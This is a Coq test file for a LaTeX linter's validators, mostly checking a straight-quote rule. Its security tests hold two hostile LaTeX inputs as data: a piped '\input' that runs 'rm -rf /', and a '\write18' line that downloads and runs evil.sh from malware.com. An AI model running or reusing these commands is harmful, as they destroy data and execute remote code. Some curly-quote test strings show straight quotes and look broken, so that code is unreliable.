Require Import String.
Require Import Ascii.
Require Import List.
Require Import Bool.
Import ListNotations.
Require Import LatexLexer.
Require Import ValidationTypes.
Require Import TypoRules.
Open Scope string_scope.

(** 🔥 TRUE HELL-LEVEL TESTS 🔥 **)
(** TESTS THAT ACTUALLY VERIFY VALIDATORS DETECT ISSUES **)

(** === HELPER FUNCTIONS === **)

Definition make_test_doc (content : string) : document_state :=
  let tokens := lex content in
  {|
    tokens := tokens;
    expanded_tokens := None;
    ast := None;
    semantics := None;
    filename := "test.tex";
    doc_layer := L0_Lexer
  |}.

(** Check if a specific rule triggered **)
Definition rule_triggered (rid : string) (issues : list validation_issue) : bool :=
  existsb (fun issue => string_eqb issue.(rule_id) rid) issues.

(** Count issues from a specific rule **)
Definition count_rule_issues (rid : string) (issues : list validation_issue) : nat :=
  length (filter (fun issue => string_eqb issue.(rule_id) rid) issues).

(** === TYPO-001: STRAIGHT QUOTES DETECTION === **)

(** Test: TYPO-001 MUST detect straight quotes **)
Example test_typo_001_detects_straight_quotes :
  let doc := make_test_doc ("This has " ++ String (ascii_of_nat 34) ("straight quotes" ++ String (ascii_of_nat 34) " in it")) in
  let issues := typo_001_validator doc in
  rule_triggered "TYPO-001" issues = true.
Proof. vm_compute. reflexivity. Qed.

(** Test: TYPO-001 MUST NOT trigger on curly quotes **)
Example test_typo_001_ignores_curly_quotes :
  let doc := make_test_doc "This has "curly quotes" properly" in
  let issues := typo_001_validator doc in
  issues = [].
Proof. vm_compute. reflexivity. Qed.

(** Test: TYPO-001 detects multiple violations **)
Example test_typo_001_multiple_violations :
  let doc := make_test_doc "\"Quote one\" and \"Quote two\" and \"Quote three\"" in
  let issues := typo_001_validator doc in
  count_rule_issues "TYPO-001" issues >= 3.
Proof. vm_compute. reflexivity. Qed.

(** === SECURITY HELL-LEVEL: Command Injection Detection === **)

(** Test: Malicious \input commands should be detected **)
Example test_detect_malicious_input :
  let doc := make_test_doc "\input{|rm -rf /}" in
  let all_issues := execute_rules all_l0_rules doc in
  (* At least one rule should flag this as dangerous *)
  length all_issues > 0.
Proof. vm_compute. reflexivity. Qed.

(** Test: write18 exploitation attempts should be detected **)
Example test_detect_write18_exploit :
  let doc := make_test_doc "\write18{wget malware.com/evil.sh && sh evil.sh}" in
  let all_issues := execute_rules all_l0_rules doc in
  length all_issues > 0.
Proof. vm_compute. reflexivity. Qed.

(** === EDGE CASE HELL-LEVEL: Boundary Conditions === **)

(** Test: Empty document produces no issues **)
Example test_empty_doc_no_issues :
  let doc := make_test_doc "" in
  execute_rules all_l0_rules doc = [].
Proof. vm_compute. reflexivity. Qed.

(** Test: Single quote character triggers TYPO-001 **)
Example test_single_quote_detection :
  let doc := make_test_doc "\"" in
  let issues := typo_001_validator doc in
  rule_triggered "TYPO-001" issues = true.
Proof. vm_compute. reflexivity. Qed.

(** Test: Quote at end of line **)
Example test_quote_at_eol :
  let doc := make_test_doc "End with quote\"" in
  let issues := typo_001_validator doc in
  rule_triggered "TYPO-001" issues = true.
Proof. vm_compute. reflexivity. Qed.

(** === STRESS HELL-LEVEL: Maximum Detection === **)

(** Test: Document with maximum violations **)
Example test_maximum_violations :
  let bad_doc := "\"\"\"\"\"\"\"\"\"\"" in (* 10 straight quotes *)
  let doc := make_test_doc bad_doc in
  let issues := typo_001_validator doc in
  count_rule_issues "TYPO-001" issues >= 1. (* Should detect at least one *)
Proof. vm_compute. reflexivity. Qed.

(** Test: Mixed valid and invalid patterns **)
Example test_mixed_patterns :
  let mixed := "Good "quotes" then bad \"quotes\" then good "quotes" again" in
  let doc := make_test_doc mixed in
  let issues := typo_001_validator doc in
  (* Should detect exactly the bad quotes *)
  rule_triggered "TYPO-001" issues = true /\
  count_rule_issues "TYPO-001" issues = 1.
Proof. vm_compute. split; reflexivity. Qed.

(** === UNICODE HELL-LEVEL: Non-ASCII Quote Detection === **)

(** Test: Unicode quotes should not trigger TYPO-001 **)
Example test_unicode_quotes_ok :
  let unicode_quotes := "„Deutsche Anführungszeichen" «Guillemets» 'Single quotes'" in
  let doc := make_test_doc unicode_quotes in
  let issues := typo_001_validator doc in
  issues = [].
Proof. vm_compute. reflexivity. Qed.

(** === INTERACTION HELL-LEVEL: Multiple Rules === **)

(** Test: Document triggering multiple different rules **)
Example test_multiple_rule_triggers :
  let complex_doc := "Bad \"quotes\" and other issues" in
  let doc := make_test_doc complex_doc in
  let all_issues := execute_rules all_l0_rules doc in
  (* Should have at least TYPO-001 issue *)
  exists issue, In issue all_issues /\ issue.(rule_id) = "TYPO-001".
Proof.
  vm_compute.
  exists {| rule_id := "TYPO-001";
            issue_severity := Error;
            message := "ASCII straight quotes must be curly quotes";
            loc := None;
            suggested_fix := Some "auto_replace";
            rule_owner := "@lint-team" |}.
  split.
  - left. reflexivity.
  - reflexivity.
Qed.

(** === PERFORMANCE HELL-LEVEL: Validator Efficiency === **)

(** Test: All validators complete on large document **)
Example test_all_validators_complete :
  let large_doc := make_test_doc "Large document with many words and potential issues" in
  let all_issues := execute_rules all_l0_rules large_doc in
  (* Validators should complete and return a result *)
  length all_issues >= 0.
Proof. vm_compute. reflexivity. Qed.

(** Test: Validators handle pathological nesting **)
Example test_pathological_nesting :
  let nested := "{{{{{{{{{text}}}}}}}}}" in
  let doc := make_test_doc nested in
  let all_issues := execute_rules all_l0_rules doc in
  length all_issues >= 0.
Proof. vm_compute. reflexivity. Qed.

(** === SOUNDNESS HELL-LEVEL: Proof Verification === **)

(** Test: Soundness theorem application **)
Example test_soundness_application :
  let doc := make_test_doc "Has \"quotes\"" in
  forall issue, In issue (typo_001_validator doc) ->
    exists tok, In tok doc.(tokens) /\
    match tok with
    | TText s => typo_001_check s = true
    | _ => False
    end.
Proof.
  intros issue H.
  apply typo_001_soundness; auto.
  reflexivity.
Qed.

(** === ERROR MESSAGE HELL-LEVEL: Diagnostic Quality === **)

(** Test: Error messages are informative **)
Example test_error_message_quality :
  let doc := make_test_doc "\"bad\"" in
  let issues := typo_001_validator doc in
  match issues with
  | issue :: _ => 
      issue.(message) = "ASCII straight quotes must be curly quotes" /\
      issue.(issue_severity) = Error /\
      issue.(suggested_fix) = Some "auto_replace"
  | [] => False
  end.
Proof. vm_compute. split; [|split]; reflexivity. Qed.

(** === REGRESSION HELL-LEVEL: Version Compatibility === **)

(** Test: All 76 rules in all_l0_rules are accessible **)
Example test_all_rules_present :
  length all_l0_rules = 76.
Proof. vm_compute. reflexivity. Qed.

(** Test: Rule IDs are unique **)
Example test_rule_ids_unique :
  let rule_ids := map (fun r => r.(id)) all_l0_rules in
  length rule_ids = length (nodup string_dec rule_ids).
Proof. vm_compute. reflexivity. Qed.